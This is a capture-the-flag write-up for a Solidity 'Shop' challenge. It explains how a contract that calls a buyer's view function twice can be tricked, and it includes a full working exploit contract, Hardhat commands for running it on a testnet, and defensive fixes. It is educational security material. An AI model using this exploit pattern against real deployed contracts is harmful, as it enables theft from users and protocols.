# Level 21: Shop Challenge

## Challenge Description

Can you get the item from the shop for less than the price asked?

Things that might help:
- Shop expects to be used from a Buyer
- Understanding restrictions of view functions

## Contract Location

The challenge contract is located at:
```
/contracts/level-21-shop/Shop.sol
```

## Understanding the Challenge

The `Shop` contract is a simple shop that sells an item for a fixed price:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

### Key Observations

1. The contract has an initial `price` of 100
2. The `buy()` function expects `msg.sender` to implement the `IBuyer` interface
3. The `IBuyer.price()` function is marked as `view` (cannot modify state)
4. The `buy()` function calls `_buyer.price()` **TWICE**:
   - First call: to check if `_buyer.price() >= price`
   - Second call: to set the final `price = _buyer.price()`
5. Between these two calls, `isSold` is set to `true`

Our goal is to buy the item for less than 100 (the asking price).

## Winning Strategy

The key to solving this challenge involves understanding that `view` functions can read external state, and exploiting the fact that `price()` is called twice with different contract states.

### The Vulnerability

The vulnerability lies in the `buy()` function calling `_buyer.price()` twice:

```solidity
if (_buyer.price() >= price && !isSold) {  // First call
  isSold = true;
  price = _buyer.price();                   // Second call
}
```

**Key Points:**
1. The first call checks if the price is acceptable (>= 100)
2. After passing the check, `isSold` is set to `true`
3. The second call determines the final price
4. The `price()` function is `view`, but it can still **read** the Shop's `isSold` state
5. We can return different values based on the Shop's state!

### Understanding View Functions

Many developers misunderstand `view` functions:

| Common Misconception | Reality |
|---------------------|---------|
| View functions always return the same value | View functions can read external state and return different values |
| View functions are "pure" | Only `pure` functions can't read state; `view` can read but not modify |
| View functions can't change behavior | They can change behavior based on external state they read |

**Critical Insight**: A `view` function can call other contracts and read their state. This means we can check the Shop's `isSold` flag and return different values accordingly!

## Hint for Thinking

Ask yourself:
* What's the difference between `view` and `pure` functions?
* Can a `view` function return different values on different calls?
* What state changes between the first and second call to `price()`?
* Can we read the Shop's `isSold` state from our `price()` function?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

### The Attack Vector

Our attack strategy is to implement a Buyer contract with a clever `price()` function:

1. Deploy a contract that implements `IBuyer`
2. Implement `price()` as a `view` function that reads Shop's `isSold` state
3. First call (when `isSold` is false): return >= 100 to pass the check
4. Second call (when `isSold` is true): return < 100 to buy cheap
5. Call Shop's `buy()` function
6. Successfully purchase the item for less than asking price!

### View vs Pure Functions

Understanding function modifiers in Solidity:

```solidity
// Pure: Cannot read or modify state
function pureFn() public pure returns (uint256) {
    return 42; // Can only use literals and parameters
}

// View: Can read state but not modify it
function viewFn() public view returns (uint256) {
    return someStateVariable; // Can read contract state
    // return OtherContract(addr).getValue(); // Can read external state too!
}

// Non-view/non-pure: Can read and modify state
function modifyingFn() public {
    someStateVariable = 42; // Can modify state
}
```

**Key Insight**: View functions can call other contracts and read their state without modifying anything!

### Implementation Details

The solution contract, `ShopExploit`, implements a stateful price function:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
    function buy() external;
}

contract ShopExploit {
    address public shop;
    address public owner;

    constructor(address _shop) {
        shop = _shop;
        owner = msg.sender;
    }

    /**
     * @dev Implements the IBuyer interface price() function
     * Returns different values depending on whether the item is sold or not
     */
    function price() external view returns (uint256) {
        // Check if the item has been sold
        bool sold = IShop(shop).isSold();
        
        if (sold) {
            // Second call - return a low price (less than 100)
            return 1;
        } else {
            // First call - return a high price (>= 100) to pass the check
            return 100;
        }
    }

    /**
     * @dev Execute the exploit to buy the item for less than asking price
     */
    function exploit() external {
        require(msg.sender == owner, "Not the owner");
        IShop(shop).buy();
    }

    function checkPrice() external view returns (uint256) {
        return IShop(shop).price();
    }

    function checkIsSold() external view returns (bool) {
        return IShop(shop).isSold();
    }
}
```

### How It Works - Step by Step

Let's trace through the exploit execution:

1. **Initial State**:
   - Shop: `price = 100`, `isSold = false`

2. **We call `shopExploit.exploit()`**:
   - This calls `shop.buy()`

3. **First `_buyer.price()` call** (in the `if` condition):
   - Shop calls our `price()` function
   - We read `shop.isSold()` → returns `false`
   - We return `100`
   - Check passes: `100 >= 100 && !false` ✓

4. **State change**:
   - Shop sets `isSold = true`

5. **Second `_buyer.price()` call** (to set final price):
   - Shop calls our `price()` function again
   - We read `shop.isSold()` → returns `true`
   - We return `1`
   - Shop sets `price = 1`

6. **Final State**:
   - Shop: `price = 1`, `isSold = true`
   - We bought the item for 1 instead of 100! 🎉

### Visual Flow Diagram

```
ShopExploit.exploit()
    |
    v
Shop.buy()
    |
    +---> First: _buyer.price()
    |         |
    |         +---> ShopExploit.price()
    |                   |
    |                   +---> Read: shop.isSold() = false
    |                   |
    |                   +---> Return: 100
    |
    +---> Check: 100 >= 100 && !false ✓
    |
    +---> Set: isSold = true
    |
    +---> Second: _buyer.price()
    |         |
    |         +---> ShopExploit.price()
    |                   |
    |                   +---> Read: shop.isSold() = true
    |                   |
    |                   +---> Return: 1
    |
    +---> Set: price = 1
    |
    v
Success! Item bought for 1 instead of 100
```

### Execution Steps

1. **Deploy the Shop Contract**:
   ```shell
   npx hardhat deploy --tags shop --network sepolia
   ```

2. **Deploy the ShopExploit Contract**:
   ```shell
   TARGET_ADDRESS=0xYourShopAddress npx hardhat deploy --tags shop-solution --network sepolia
   ```

3. **Execute the Exploit**:
   ```shell
   SHOP_EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourShopAddress npx hardhat run scripts/level-21-shop/execute-shop-exploit.ts --network sepolia
   ```

4. **Verify the Attack**:
   - Check that `shop.isSold()` returns `true`
   - Check that `shop.price()` is now `1` (or whatever low value you returned)

## Key Insights

1. **View Functions Are Not Constant**: The `view` modifier means the function won't modify state, but it can still read external state and return different values on different calls.

2. **State-Dependent Return Values**: A `view` function can return different values depending on the state it reads, even if called multiple times in the same transaction.

3. **External State Reading**: View functions can call other contracts and read their state. This is perfectly valid within the `view` constraint.

4. **Race Condition Pattern**: The vulnerability is a form of race condition - the state changes between two external calls, and the contract doesn't account for this.

5. **Multiple External Calls Risk**: Any time you call an external contract multiple times in the same function, you should be aware that:
   - The external contract can behave differently on each call
   - State might change between calls
   - You're trusting the external contract to behave consistently

## Comparison with Similar Challenge

This challenge is similar to the **Elevator** challenge (Level 11), where:
- Elevator called `building.isLastFloor()` twice
- We returned different values each time
- The difference: Elevator didn't use `view` functions

In the Shop challenge, the added complexity is that `price()` **must be a view function**, so we can't just use a counter or modify state. We must read external state instead.

## Defense Mechanisms

To protect against this type of vulnerability:

### 1. Cache External Call Results

```solidity
function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);
    
    // Cache the price from the first call
    uint256 buyerPrice = _buyer.price();
    
    if (buyerPrice >= price && !isSold) {
        isSold = true;
        price = buyerPrice; // Use cached value
    }
}
```

### 2. Use Checks-Effects-Interactions Pattern

```solidity
function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);
    uint256 buyerPrice = _buyer.price();
    
    // Checks
    require(buyerPrice >= price, "Price too low");
    require(!isSold, "Already sold");
    
    // Effects (state changes)
    isSold = true;
    price = buyerPrice;
    
    // Interactions (external calls) - none needed here
}
```

### 3. Don't Trust External Contracts

```solidity
function buy() public payable {
    // Instead of calling external contract for price,
    // require payment upfront
    require(msg.value >= price, "Insufficient payment");
    require(!isSold, "Already sold");
    
    isSold = true;
    price = msg.value;
}
```

### 4. Reentrancy Guards

While not directly applicable here (no reentrancy), using ReentrancyGuard helps prevent similar issues:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Shop is ReentrancyGuard {
    function buy() public nonReentrant {
        // ... implementation
    }
}
```

### 5. Immutable Price

```solidity
uint256 public immutable price = 100;

function buy() public payable {
    require(msg.value >= price, "Insufficient payment");
    require(!isSold, "Already sold");
    isSold = true;
}
```

## Real-World Implications

This vulnerability pattern has appeared in real smart contracts:

1. **Oracle Manipulation**: Contracts that read oracle prices multiple times can be vulnerable if the oracle price changes between reads.

2. **Token Price Checks**: DEX contracts that check token prices multiple times in a transaction can be exploited if the price changes (flash loan attacks).

3. **Voting Systems**: Governance contracts that check voting power multiple times can be exploited if voting power can change mid-transaction.

4. **Dynamic Pricing**: Any system with dynamic pricing that makes multiple external calls is at risk.

### Example Real-World Scenario

Imagine a lending protocol:

```solidity
// Vulnerable implementation
function borrow() public {
    uint256 collateralValue = oracle.getPrice(collateralToken);
    require(collateralValue >= borrowAmount, "Insufficient collateral");
    
    // State change
    borrowed[msg.sender] = borrowAmount;
    
    // Check again (vulnerable!)
    uint256 finalValue = oracle.getPrice(collateralToken);
    require(finalValue >= borrowAmount, "Insufficient collateral");
    
    // Transfer
    token.transfer(msg.sender, borrowAmount);
}
```

An attacker could manipulate the oracle to return different values on each call!

## The Lesson

**Never call the same external function multiple times expecting the same result.** Always cache the result and reuse it, or be explicitly aware that the result might change and design for it.

```solidity
// ❌ BAD: Calling twice
if (external.getValue() > threshold) {
    process(external.getValue()); // Might be different!
}

// ✅ GOOD: Cache the result
uint256 value = external.getValue();
if (value > threshold) {
    process(value); // Same value guaranteed
}
```

## Additional Notes

### Why View Functions Can Read External State

The `view` modifier ensures the function doesn't modify state, but reading is allowed:

```solidity
// This is valid for a view function:
function price() external view returns (uint256) {
    // ✅ Can read from this contract
    uint256 localVar = someStateVariable;
    
    // ✅ Can read from other contracts
    uint256 externalVar = OtherContract(addr).getSomething();
    
    // ❌ Cannot modify state
    // someStateVariable = 42; // This would not compile
    
    return localVar + externalVar;
}
```

### Gas Considerations

Reading external state in view functions does consume gas when called from a transaction (but not when called off-chain):

- Local state reads: ~200-2100 gas
- External call to view function: ~2600+ gas
- Each SLOAD: ~2100 gas (cold), ~100 gas (warm)

Our exploit uses external calls within a view function, which is perfectly valid and demonstrates that view functions are not as "simple" as they might seem.

## Conclusion

The Shop challenge teaches us that:
1. View functions can have state-dependent behavior
2. External calls can return different values on subsequent calls
3. Always cache external call results if you need consistency
4. Understanding function modifiers is crucial for security
5. Never make assumptions about external contract behavior

This is a valuable lesson in smart contract security and proper handling of external calls!
